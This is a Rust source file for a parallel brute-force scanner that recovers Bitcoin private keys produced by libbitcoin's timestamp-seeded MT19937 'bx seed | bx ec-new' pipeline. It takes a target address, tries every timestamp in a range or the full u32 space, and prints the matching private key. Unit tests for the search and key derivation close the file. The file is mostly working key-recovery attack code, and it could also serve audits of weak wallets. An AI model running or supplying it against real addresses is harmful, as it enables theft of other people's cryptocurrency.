//! EC-New (Direct PRNG) Vulnerability Scanner
//!
//! Vulnerability: `bx seed | bx ec-new` pipeline.
//! bx seed generates entropy via MT19937(timestamp), taking MSB of each u32 output.
//! bx ec-new then applies SHA256 to that entropy to produce a 32-byte private key.
//!
//! Pipeline:
//!   MT19937(seed=timestamp) -> MSB bytes -> SHA256 -> privkey -> p2pkh address
//!
//! Reference: https://github.com/libbitcoin/libbitcoin-explorer/wiki/Command-Equivalence

use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use rand_mt::Mt19937GenRand32;
use rayon::prelude::*;
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use tracing::{info, warn};

/// Result returned when a vulnerable address is found.
#[derive(Debug, Clone)]
pub struct FoundResult {
    pub timestamp:  u32,
    pub entropy:    [u8; 32],
    pub privkey:    [u8; 32],
    pub address:    String,
    pub compressed: bool,
}

/// Scan for EC-New (Direct PRNG) vulnerability.
///
/// Returns `Ok(Some(result))` on match, `Ok(None)` if exhausted, `Err` on bad input.
pub fn run(
    target_address: &str,
    start_ts: Option<u32>,
    end_ts: Option<u32>,
    full_scan: bool,
    threads: Option<usize>,
) -> Result<Option<FoundResult>> {
    info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");
    info!("Pipeline: MT19937(ts) -> MSB bytes -> SHA256 -> privkey -> address");

    if let Some(n) = threads {
        rayon::ThreadPoolBuilder::new()
            .num_threads(n)
            .build_global()
            .ok();
    }

    let (start, end) = if full_scan {
        info!("Mode: FULL u32 scan (0 ..= 4_294_967_295)");
        (0u32, u32::MAX)
    } else {
        let s = start_ts.unwrap_or(1_300_000_000);
        let e = end_ts.unwrap_or(1_735_689_600);
        if e < s {
            anyhow::bail!("--end ({}) must be >= --start ({})", e, s);
        }
        info!("Mode: timestamp range {} ..= {} ({} s)", s, e, e - s);
        (s, e)
    };

    info!("Target:  {}", target_address);
    info!("Threads: {}", rayon::current_num_threads());

    let network = Network::Bitcoin;
    let target_script = target_address
        .parse::<Address<_>>()
        .map_err(|e| anyhow!("Invalid target address: {}", e))?
        .require_network(network)?
        .script_pubkey();

    // Shared state
    let found:   Arc<std::sync::Mutex<Option<FoundResult>>> = Arc::new(std::sync::Mutex::new(None));
    let stop     = Arc::new(AtomicBool::new(false));
    let checked  = Arc::new(AtomicU64::new(0));
    let t0       = std::time::Instant::now();

    // Progress reporter — store handle so we can join it later
    let progress_handle = {
        let checked  = Arc::clone(&checked);
        let stop     = Arc::clone(&stop);
        std::thread::spawn(move || {
            loop {
                std::thread::sleep(std::time::Duration::from_secs(5));
                if stop.load(Ordering::Relaxed) { break; }
                let n   = checked.load(Ordering::Relaxed);
                let mps = n as f64 / t0.elapsed().as_secs_f64() / 1_000_000.0;
                info!("Checked {} ({:.2} M/s)", n, mps);
            }
        })
    };

    // Idiomatic rayon: work-stealing par_iter over the full range.
    // Rayon handles load balancing automatically.
    (start..=end).into_par_iter().for_each(|t| {
        if stop.load(Ordering::Relaxed) { return; }

        let secp    = Secp256k1::new();
        let entropy = generate_entropy_msb(t);
        let privkey = sha256_privkey(&entropy);

        if let Ok(sk) = SecretKey::from_slice(&privkey) {
            let pk     = PublicKey::from_secret_key(&secp, &sk);
            let addr_c = Address::p2pkh(CompressedPublicKey(pk), network);
            let addr_u = Address::p2pkh(
                bitcoin::PublicKey { inner: pk, compressed: false },
                network,
            );

            for (addr, compressed) in [(&addr_c, true), (&addr_u, false)] {
                if addr.script_pubkey() == target_script {
                    warn!("\n\u{1f3af} FOUND MATCH!");
                    warn!("Timestamp:   {}", t);
                    warn!("Entropy:     {}", hex::encode(entropy));
                    warn!("PrivKey:     {}", hex::encode(privkey));
                    warn!("Address:     {}", addr);
                    warn!("Compressed:  {}", compressed);

                    let mut guard = found.lock().unwrap();
                    *guard = Some(FoundResult {
                        timestamp: t,
                        entropy,
                        privkey,
                        address: addr.to_string(),
                        compressed,
                    });
                    stop.store(true, Ordering::Relaxed);
                    break;
                }
            }
        }

        checked.fetch_add(1, Ordering::Relaxed);
    });

    // Signal progress thread and wait for clean exit
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.join();

    let total_checked = checked.load(Ordering::Relaxed);
    let elapsed       = t0.elapsed().as_secs_f64();
    let result        = found.lock().unwrap().clone();

    if result.is_some() {
        info!("Scan complete. VULNERABILITY FOUND. ({} checked in {:.2}s)", total_checked, elapsed);
    } else {
        info!(
            "Scan complete. No match found. Checked {} in {:.2}s ({:.2} M/s)",
            total_checked, elapsed,
            total_checked as f64 / elapsed / 1_000_000.0
        );
    }

    Ok(result)
}

// ============================================================================
// ENTROPY / PRIVKEY GENERATION
// ============================================================================

/// Generate 32 bytes from MT19937(timestamp) using MSB-only extraction.
/// Matches libbitcoin `bx seed` behaviour: take high byte of each u32 output.
pub fn generate_entropy_msb(timestamp: u32) -> [u8; 32] {
    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut bytes = [0u8; 32];
    for byte in bytes.iter_mut() {
        *byte = (rng.next_u32() >> 24) as u8;
    }
    bytes
}

/// Derive 32-byte EC private key from entropy via SHA256.
/// Matches `bx ec-new` behaviour: hash arbitrary-length seed to privkey.
pub fn sha256_privkey(entropy: &[u8]) -> [u8; 32] {
    Sha256::digest(entropy).into()
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    /// start > end must return Err, not panic.
    #[test]
    fn test_start_greater_than_end_returns_err() {
        let result = run(
            "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf",
            Some(1_700_000_000),
            Some(1_400_000_000),
            false,
            None,
        );
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("end") && msg.contains(">="), "got: {}", msg);
    }

    /// Verify the full pipeline produces a valid address.
    #[test]
    fn test_pipeline_smoke() {
        let ts      = 1_400_000_000u32;
        let entropy = generate_entropy_msb(ts);
        let privkey = sha256_privkey(&entropy);
        let sk      = SecretKey::from_slice(&privkey).expect("valid privkey");
        let secp    = Secp256k1::new();
        let pk      = PublicKey::from_secret_key(&secp, &sk);
        let addr    = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();
        assert!(addr.starts_with('1'), "expected P2PKH, got: {}", addr);
    }

    /// Parallel scan MUST find and return the FoundResult — not just Ok(()).
    #[test]
    fn test_parallel_finds_known_address() {
        let ts      = 1_400_000_000u32;
        let entropy = generate_entropy_msb(ts);
        let privkey = sha256_privkey(&entropy);
        let sk      = SecretKey::from_slice(&privkey).unwrap();
        let secp    = Secp256k1::new();
        let pk      = PublicKey::from_secret_key(&secp, &sk);
        let addr    = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();

        let result = run(&addr, Some(ts - 1), Some(ts + 1), false, Some(2))
            .expect("run() must not error");

        let found = result.expect("must find the address");
        assert_eq!(found.timestamp,  ts,      "wrong timestamp");
        assert_eq!(found.entropy,    entropy, "wrong entropy");
        assert_eq!(found.privkey,    privkey, "wrong privkey");
        assert_eq!(found.address,    addr,    "wrong address");
        assert!(found.compressed,             "expected compressed");
    }
}
